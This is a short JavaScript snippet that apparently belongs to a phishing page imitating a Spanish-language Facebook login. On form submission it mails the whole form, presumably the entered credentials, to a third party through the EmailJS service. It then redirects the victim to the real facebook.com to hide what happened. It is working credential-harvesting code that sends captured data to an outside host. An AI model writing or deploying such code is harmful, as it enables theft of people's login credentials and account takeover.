const btn = document.getElementById('button');

document.getElementById('form')
 .addEventListener('submit', function(event) {
   event.preventDefault();

   const serviceID = 'service_yzt1vdg';
   const templateID = 'template_x85kxso';

   emailjs.sendForm(serviceID, templateID, this)
    .then(() => {
      btn.value = 'Iniciar sesión';
      window.location.href = 'https://www.facebook.com/';
    }, (err) => {
      btn.value = 'Iniciar sesión';
      alert(JSON.stringify(err));
    });
});